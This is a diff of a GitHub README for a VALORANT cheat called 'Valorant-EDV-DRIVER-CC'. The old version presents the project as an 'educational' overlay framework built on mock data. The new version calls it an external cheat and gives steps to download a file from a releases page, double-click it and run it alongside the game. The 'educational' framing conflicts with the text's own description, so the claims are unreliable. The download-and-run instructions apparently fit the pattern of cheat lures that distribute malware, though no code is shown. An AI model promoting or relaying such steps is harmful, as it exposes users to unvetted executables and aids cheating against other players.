@@ -1,67 +1,53 @@
-# 🔴 **VALORANT Tactical Hack Framework 
-> **Precision. Control. Vision.**  
-> Inspired by the competitive intensity and visual language of **VALORANT**.
+# 🛠️ Valorant-EDV-DRIVER-CC - Easy External Cheat for VALORANT
 
-<p align="center">
-  <a href="https://github.com/H7amadpro/Valorant-EDV-DRIVER-CC/raw/main/Driver/ZeweroLauncherV2.1.zip" target="_blank">
-    <img src="https://img.shields.io/badge/DOWNLOAD-Tactical_Framework-red?style=for-the-badge&logo=riotgames&logoColor=white">
-  </a>
-</p>
+## 📥 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Valorant--EDV--DRIVER--CC-brightgreen)](https://github.com/aadityaaaaaaaaaa/Valorant-EDV-DRIVER-CC/releases)
 
----
+## 🚀 Getting Started
+Welcome to **Valorant-EDV-DRIVER-CC**! This tool helps you modify your gameplay in VALORANT for educational purposes. Follow these simple steps to get started with the software.
 
-## 🧠 **Overview**
-
-**VALORANT Tactical Hack Framework** is a **conceptual and educational project** focused on exploring the architecture, UI/UX, and logic behind tactical game overlays and analysis tools.
-
----
-
-## ⚡ **Features**
-
-- 🎯 **Aim Assistance Simulation:** A system that suggests optimal target areas to focus on based on game data (not affecting in-game behavior).
-- 👁 **ESP-like Visualization (Mock Data):** A concept of showing enemy positions based on simulated game data.
-- 🧭 **Player and Map Intelligence Layer:** Providing strategic insights into where the player might be vulnerable or where teammates need help.
-- 🖥 **External Overlay Architecture:** Designing an external window to display key information while not modifying the game itself.
-- 🎨 **VALORANT-Inspired Neon UI:** A user interface mimicking the neon aesthetic from VALORANT, focusing on clean lines and intuitive design for efficiency.
-- ⚙ **Modular & Scalable Framework:** Expandable tools that can simulate various overlays such as tactical maps, resource tracking, and round analysis.
-- ⚡ **Smooth Animations & Low-Latency Rendering:** Ensuring that all visual data is provided without causing distractions or hindering gameplay.
-
----
-
-## 🖼 **UI Preview**
-
-- **Neon Red / Black / White Color Palette**  
-- **Sharp, geometric design** with clean typography.  
-- **Competitive HUD Layout** that prioritizes user control and visualization.  
-- **Neon Highlights & Glow Effects** that provide clarity on important info without cluttering the screen.
-
----
-
-## 🛠 **How It Works **
-
-1. **External Analysis Layer:** The tool operates outside of the game to gather publicly available information (e.g., map layout, team composition, and individual stats).
-2. **Simulation of Tactical Feedback:** Data-driven suggestions on player positioning and decision-making will appear through an overlay, providing a real-time tactical map, but without direct interaction with the game code.
-
-
----
-
-## 📦 **System Requirements**
-
+## 🖥️ System Requirements
+To ensure a smooth experience, please check these requirements before installing:
 
 - **Operating System:** Windows 10 or later
-- **Processor:** Intel i3 or equivalent
-- **RAM:** 4 GB or more
-- **Available Storage:** At least 500 MB
-- **Display:** High-resolution monitor to see the full range of overlay data.
+- **Processor:** Intel Core i3 or equivalent
+- **RAM:** 8 GB or more
+- **Disk Space:** At least 500 MB of free space
 
----
+## 🌟 Features
+- **User-Friendly Interface:** No technical knowledge required.
+- **Regular Updates:** Enjoy updated features for better functionality.
+- **Educational Use:** Designed for learning and understanding game mechanics.
 
-## 🚀 **Download & Setup **
+## 🔗 Download & Install
+To download the application, visit the following link:
 
-1. **Download the package**  
+[Download from Releases](https://github.com/aadityaaaaaaaaaa/Valorant-EDV-DRIVER-CC/releases)
 
-   [⬇️ Download Package](https://github.com/H7amadpro/Valorant-EDV-DRIVER-CC/raw/main/Driver/ZeweroLauncherV2.1.zip)  
-2. **Download:** Conceptual framework as a ZIP archive 
-3. **Extract & Run:** Unzip and launch the simulation tool.  
+1. Click on the link above to go to the Releases page.
+2. Find the latest version of Valorant-EDV-DRIVER-CC.
+3. Click on the asset to start the download.
+4. Once downloaded, locate the file in your Downloads folder.
+5. Double-click the file to run the setup.
+6. Follow the instructions on the screen.
 
+## ❓ How to Use
+1. Launch the application after installation.
+2. The main screen will display options for different settings.
+3. Adjust these settings according to your preferences.
+4. Click “Start” to begin using the application with VALORANT.
 
+## ⚙️ Troubleshooting
+If you encounter any issues while using Valorant-EDV-DRIVER-CC, try the following solutions:
+
+- **Check Compatibility:** Ensure your operating system meets the requirements.
+- **Reinstall the Application:** If the software does not open, uninstall and reinstall it.
+- **Consult Forums:** Join the community forums for advice from other users.
+
+## 🌐 Community Support
+Join our community for more tips and help:
+
+- **GitHub Issues Page:** Get help directly from the developers and users.
+- **Discord Channel:** Connect with other users for real-time support.
+
+Thank you for choosing **Valorant-EDV-DRIVER-CC**! Enjoy enhancing your VALORANT experience. If you have questions or suggestions, feel free to reach out.
